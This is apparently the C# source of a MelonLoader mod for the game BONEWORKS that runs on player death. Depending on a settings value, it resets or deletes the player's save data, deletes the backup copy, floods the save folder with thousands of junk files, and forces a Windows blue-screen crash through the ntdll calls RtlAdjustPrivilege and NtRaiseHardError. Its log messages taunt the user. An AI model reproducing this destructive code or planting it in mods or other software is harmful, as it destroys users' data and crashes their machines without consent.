using MelonLoader;
using ModThatIsNotMod;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using UnityEngine;

namespace TheFunny
{
    public static class BuildInfo
    {
        public const string Name = "the_funny"; // Name of the Mod.  (MUST BE SET)
        public const string Author = "extraes"; // Author of the Mod.  (Set as null if none)
        public const string Company = "My left nut"; // Company that made the Mod.  (Set as null if none)
        public const string Version = "4.2.0"; // Version of the Mod.  (MUST BE SET)
        public const string DownloadLink = "https://bit.ly/3w3a5ju"; // Download Link for the Mod.  (Set as null if none)
    }

    public class TheFunny : MelonMod
    {
        public override void OnApplicationStart()
        {
            MelonLogger.Msg("helo");
            string SLZFolder = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "Low\\Stress Level Zero";

            Hooking.OnPlayerDeath += PlayerHooks_OnPlayerDeath;
            Hooking.OnPlayerDeathImminent += nearDeath;
        }

        private void nearDeath(bool _)
        {
            string SLZFolder = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "Low\\Stress Level Zero";

            MelonLogger.Msg($"I think you've got your BW save in {SLZFolder} and I'm feeling a little explosive right about now");
            MelonLogger.Msg("It would be a shame...");
        }

        private unsafe void PlayerHooks_OnPlayerDeath()
        {
            MelonPreferences.CreateCategory("the_funny", "the_funny");
            MelonPreferences.CreateEntry("the_funny", "nuke_type", (int)NukeTypes.crashOnly);
            int NukeType = Math.Abs(MelonPreferences.GetEntryValue<int>("the_funny", "nuke_type"));
            string SLZFolder = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"Low\Stress Level Zero";


            switch (NukeType)
            {
                case (int)NukeTypes.crashOnly:
                    MelonLogger.Msg("Nevermind, you're good.");
                    break;

                case (int)NukeTypes.middleGround:
                    // Overwrite save data
                    Data_Manager.Instance.DATA_DEFAULT();
                    // Rename the boneworks save
                    MelonLogger.Warning($"DON'T GO TO SLZ OVER THIS MOD!!! Or me for that matter, because your save data is at {Directory.GetCurrentDirectory()}\\UserData\\BONEWORKS_Old lol");
                    if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\UserData\\BONEWORKS_Old"))
                    {
                        DirectoryCopy(SLZFolder + "\\BONEWORKS", Directory.GetCurrentDirectory() + "\\UserData\\BONEWORKS_Old", true);
                    }
                    File.Create(Directory.GetCurrentDirectory() + "\\HEY!!! YOUR SAVE DATA IS IN USERDATA!!!").Dispose();
                    File.Create(SLZFolder + "\\HEY!!! YOUR SAVE DATA IS IN USERDATA!!!").Dispose();
                    break;

                case (int)NukeTypes.theFunny:
                    {
                        // Delete the boneworks saves and then crash the PC
                        MelonLogger.Msg("SEETHE, COPE, DILATE");
                        // Delete saves
                        Data_Manager.Instance.DATA_DEFAULT();

                        if (Directory.Exists(Directory.GetCurrentDirectory() + "\\UserData\\BONEWORKS_Old"))
                        {
                            Directory.Delete(Directory.GetCurrentDirectory() + "\\UserData\\BONEWORKS_Old", true);
                            MelonLogger.Msg("There was a BONEWORKS_Old folder! Deleting it now!");
                        }
                        MelonLogger.Warning("DON'T GO TO SLZ OVER THIS MOD!!! Or me for that matter, because your save data is at JOEMAMA'S HOUSE BITCH!");
                        MelonLogger.Warning("YOUR SAVE IS GONE, GO DOWNLOAD THE 100% SAVE LMAOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO");
                        File.Create(SLZFolder + "\\Brought to you by Cope and Sneed").Dispose();

                        int i = 0;
                        while (i < 10000)
                        {
                            i++;
                            try
                            {
                                MelonLogger.Msg("SEETHE, COPE, DILATE");
                                File.Create(SLZFolder + $"\\COPE AND SEETHE-{i}").Dispose();
                            }
                            catch
                            {
                                MelonLogger.Error("COPE AND SEETHE");
                            }
                        }

                        // Crash the PC
                        Boolean t1;
                        uint t2;
                        RtlAdjustPrivilege(19, true, false, out t1);
                        NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
                    }
                    break;

                case (int)NukeTypes.theFunnier:
                    {
                        // Delete the boneworks saves and then crash the PC
                        MelonLogger.Msg("Mashallah brother.");
                        // Delete saves
                        Data_Manager.Instance.DATA_DEFAULT();

                        if (Directory.Exists(Directory.GetCurrentDirectory() + "\\UserData\\BONEWORKS_Old"))
                        {
                            Directory.Delete(Directory.GetCurrentDirectory() + "\\UserData\\BONEWORKS_Old", true);
                            MelonLogger.Msg("Mashallah brother.");
                        }
                        MelonLogger.Msg("Mashallah brother.");
                        MelonLogger.Msg("Mashallah brother.");
                        try { File.Create(SLZFolder + "\\!Mashallah brother.").Dispose(); } catch { MelonLogger.Error("Mashallah brother."); }

                        string bismillahPath = SLZFolder + "\\In the name of God the Most Gracious the Most Merciful";
                        MelonLogger.Msg("Mashallah brother.");

                        byte[] data;
                        using (Stream stream = Assembly.GetManifestResourceStream("Fuck_am_I_doing.Mashallahbrother.txt"))
                        {
                            using (var ms = new MemoryStream())
                            {
                                stream.CopyTo(ms);
                                data = ms.ToArray();
                            }
                        }


                        int i = 0;
                        int offset = 0;
                        while (File.Exists(SLZFolder + $"\\Mashallah brother - {offset + 1000}"))
                        {
                            offset += 1000;
                        }
                        while (i < 10000)
                        {
                            i++;
                            MelonLogger.Msg("Mashallah brother.");
                            try
                            {
                                File.Create(SLZFolder + $"\\Mashallah brother - {i + offset}").Dispose();
                                File.WriteAllBytes(bismillahPath + $" - {i + offset}.txt", data);
                            }
                            catch
                            {
                                MelonLogger.Error("Mashallah brother.");
                            }
                        }
                        MelonLogger.Msg("Mashallah brother.");

                        // Crash the PC
                        Boolean t1;
                        uint t2;
                        RtlAdjustPrivilege(19, true, false, out t1);
                        NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
                    }
                    break;

                case int.MinValue:
                    MelonLogger.Msg("I SEE YOU WITH DNSPY, YOU A BITCH");
                    break;
            }
            Application.Quit(69);
            Thread.Sleep(1000);
            MelonLogger.Msg("Well... This is awkward...");
            MelonLogger.Msg("The game should be closed by now... Come here often?");

        }
        private enum NukeTypes
        {
            crashOnly = 69,
            middleGround = 420,
            theFunny = 42069,
            theFunnier = 69420
        }

        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);


        // Yes, I stole this from https://stackoverflow.com/questions/1974019/folder-copy-in-c-sharp. No, I do not have shame.
        private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
        {
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);
            DirectoryInfo[] dirs = dir.GetDirectories();

            // If the source directory does not exist, throw an exception.
            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Source directory does not exist or could not be found: "
                    + sourceDirName);
            }

            // If the destination directory does not exist, create it.
            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }


            // Get the file contents of the directory to copy.
            FileInfo[] files = dir.GetFiles();

            foreach (FileInfo file in files)
            {
                // Create the path to the new copy of the file.
                string temppath = Path.Combine(destDirName, file.Name);

                // Copy the file.
                file.CopyTo(temppath, false);
            }

            // If copySubDirs is true, copy the subdirectories.
            if (copySubDirs)
            {

                foreach (DirectoryInfo subdir in dirs)
                {
                    // Create the subdirectory.
                    string temppath = Path.Combine(destDirName, subdir.Name);

                    // Copy the subdirectories.
                    DirectoryCopy(subdir.FullName, temppath, copySubDirs);
                }
            }
        }
    }
}
